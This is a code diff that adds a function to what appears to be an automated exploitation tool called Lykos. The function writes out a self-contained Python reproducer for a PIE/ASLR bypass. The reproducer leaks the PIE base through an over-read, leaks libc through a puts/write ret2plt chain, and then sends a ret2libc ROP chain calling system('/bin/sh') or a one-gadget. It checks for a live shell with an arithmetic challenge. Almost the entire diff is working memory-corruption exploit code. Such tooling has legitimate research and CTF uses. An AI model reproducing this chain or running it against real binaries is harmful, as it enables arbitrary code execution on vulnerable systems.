@@ -662,6 +662,106 @@ def pie_ret2libc_leak(exe, workdir, *, offset, leak_trigger, target_bytes, pop_r
     return last
 
 
+def render_pie_ret2plt_script(*, offset, leak_trigger, anchors, pop_rdi_off, puts_plt_off,
+                              puts_got_off, ret_to_off, leaker, puts_libc_off, system_off,
+                              binsh_off, one_gadget_off=None, align_off=None, pop_rsi_off=None,
+                              pop_rdx_off=None, write_plt_off=None) -> bytes:
+    """Self-contained stdlib reproducer for the PIE ret2plt -> ret2libc chain (`_pie_ret2plt_exploit`):
+    two leaks in ONE process, re-derived live on every run so a freshly randomized base/libc is
+    defeated honestly.
+
+      phase 0: feed `leak_trigger` into the staging over-read; harvest the spilled pointer words and
+               corroborate the PIE base against the baked image `anchors` (>=2 distinct slots, exactly
+               as `recover_pie_base` does) -- no analysis engine, no ASLR-off oracle.
+      stage 1: a base-relocated `puts(puts@GOT)` / `write(1,GOT,8)` chain prints the libc address of
+               the leaked symbol and returns to `ret_to` (main), so the loop reads again.
+      stage 2: resolve the libc base (leaked - `puts_libc_off`), re-feed the staging read, then
+               ret2libc `system("/bin/sh")` (or the confirmed one-gadget), with the live run's
+               stack-alignment pad. A real shell EVALUATES a random arithmetic challenge ([+]/exit 0);
+               a target that merely echoes stdin prints the literal `$((..))` and fails the grade.
+
+    All image `*_off` are relocated by the recovered PIE base; the libc `*_off` by the resolved libc
+    base; `align_off` is a base-relocated `ret` for rsp alignment (the live run's choice), or None."""
+    w = (leaker == "write")
+    s1 = ("p(base+POP_RDI)+p(1)+p(base+POP_RSI)+p(base+PUTS_GOT)+p(base+POP_RDX)+p(8)"
+          "+p(base+WRITE_PLT)+p(base+RET_TO)") if w else \
+         "p(base+POP_RDI)+p(base+PUTS_GOT)+p(base+PUTS_PLT)+p(base+RET_TO)"
+    tail = ("p(libc+ONE_GADGET)" if one_gadget_off is not None
+            else "p(base+POP_RDI)+p(libc+BINSH)+p(libc+SYSTEM)")
+    return (
+        "#!/usr/bin/env python3\n"
+        "# Lykos L3 reproducer: PIE/ASLR ret2plt -> ret2libc, two leaks in one process. Authorized "
+        "use only.\n"
+        "# RUN IN A SANDBOX/VM -- this executes an untrusted binary and spawns a shell from it.\n"
+        "import os, random, select, struct, subprocess, sys, time\n"
+        "p = lambda v: struct.pack('<Q', v & (2**64-1))\n"
+        f"OFF={offset}; TRIG={leak_trigger!r}; LEAKER={leaker!r}\n"
+        f"POP_RDI={hex(pop_rdi_off)}; PUTS_PLT={hex(puts_plt_off)}; PUTS_GOT={hex(puts_got_off)}; "
+        f"RET_TO={hex(ret_to_off)}; PUTS_LIBC={hex(puts_libc_off)}\n"
+        f"POP_RSI={hex(pop_rsi_off) if pop_rsi_off is not None else None}; "
+        f"POP_RDX={hex(pop_rdx_off) if pop_rdx_off is not None else None}; "
+        f"WRITE_PLT={hex(write_plt_off) if write_plt_off is not None else None}\n"
+        f"SYSTEM={hex(system_off)}; BINSH={hex(binsh_off)}; "
+        f"ONE_GADGET={hex(one_gadget_off) if one_gadget_off is not None else None}; "
+        f"ALIGN={hex(align_off) if align_off is not None else None}\n"
+        f"ANCHORS={anchors!r}\n"
+        "def read_until(io, deadline, quiet=0.3):\n"
+        "    out, last = b'', time.time()\n"
+        "    while time.time() < deadline:\n"
+        "        r, _, _ = select.select([io.stdout], [], [], 0.1)\n"
+        "        if r:\n"
+        "            c = os.read(io.stdout.fileno(), 4096)\n"
+        "            if not c: break\n"
+        "            out, last = out + c, time.time()\n"
+        "        elif io.poll() is not None: break\n"
+        "        elif out and time.time() - last > quiet: break\n"
+        "    return out\n"
+        "def ptr_words(buf):\n"                               # the over-read spills raw LE pointers
+        "    o = []\n"
+        "    for i in range(0, max(0, len(buf) - 7)):\n"
+        "        v = int.from_bytes(buf[i:i+8], 'little')\n"
+        "        if v < (1 << 48) and 0x10 <= (v >> 40) <= 0x7f: o.append(v)\n"
+        "    return o\n"
+        "io = subprocess.Popen([sys.argv[1]], stdin=subprocess.PIPE, stdout=subprocess.PIPE,\n"
+        "                      stderr=subprocess.STDOUT)\n"
+        "time.sleep(0.2); read_until(io, time.time() + 0.5)\n"
+        "io.stdin.write(TRIG); io.stdin.flush()\n"            # phase 0: over-read -> PIE base
+        "buf = read_until(io, time.time() + 3)\n"
+        "sup = {}\n"
+        "for v in set(ptr_words(buf)):\n"
+        "    for va in ANCHORS.get(v & 0xfff, []):\n"
+        "        b = v - va\n"
+        "        if b > 0 and b % 0x1000 == 0: sup.setdefault(b, set()).add(v)\n"
+        "base = max(sup, key=lambda b: len(sup[b]), default=None)\n"
+        "if base is None or len(sup[base]) < 2:\n"
+        "    print('[-] PIE base not recovered from the over-read leak'); io.kill(); sys.exit(1)\n"
+        "print('pie base', hex(base))\n"
+        f"io.stdin.write(b'A'*OFF + {s1}); io.stdin.flush()\n"   # stage 1: leak a libc pointer
+        "burst = read_until(io, time.time() + 3)\n"
+        "raw = burst[:8] if LEAKER == 'write' else burst.split(b'\\n', 1)[0][:6]\n"
+        "if len(raw) < 6:\n"
+        "    print('[-] libc pointer not leaked'); io.kill(); sys.exit(1)\n"
+        "libc = int.from_bytes(raw.ljust(8, b'\\x00'), 'little') - PUTS_LIBC\n"
+        "if libc <= 0 or libc % 0x1000 != 0:\n"
+        "    print('[-] libc base not resolved'); io.kill(); sys.exit(1)\n"
+        "print('libc base', hex(libc))\n"
+        "io.stdin.write(TRIG); io.stdin.flush(); read_until(io, time.time() + 0.4)\n"  # re-feed staging
+        "align = p(base + ALIGN) if ALIGN is not None else b''\n"
+        f"io.stdin.write(b'A'*OFF + align + {tail}); io.stdin.flush(); time.sleep(0.3)\n"  # stage 2
+        "a, b = random.randint(1000, 9999), random.randint(1000, 9999)\n"
+        "io.stdin.write(b'echo LYKOS_SHELL_$((%d*%d))\\n' % (a, b))\n"
+        "try: io.stdin.flush(); io.stdin.close()\n"
+        "except OSError: pass\n"
+        "try: out, _ = io.communicate(timeout=6)\n"
+        "except subprocess.TimeoutExpired: io.kill(); out, _ = io.communicate()\n"
+        "sys.stdout.write(out.decode('latin-1', 'ignore'))\n"
+        "if (b'LYKOS_SHELL_%d' % (a*b)) in out:\n"
+        "    print('\\n[+] two-leak ASLR defeat reproduced -- a shell evaluated the challenge'); "
+        "sys.exit(0)\n"
+        "print('\\n[-] no shell answered the challenge'); sys.exit(1)\n"
+    ).encode()
+
+
 def ret2dlresolve(exe, workdir, *, offset, read_plt, plt0, pop_rdi, pop_rsi, pop_rdx, ret_gadget,
                   jmprel, symtab, strtab, scratch, symbol=b"system", arg=b"/bin/sh",
                   base_argv=(), timeout: float = 8.0, mem_mb: int = 2048) -> dict:
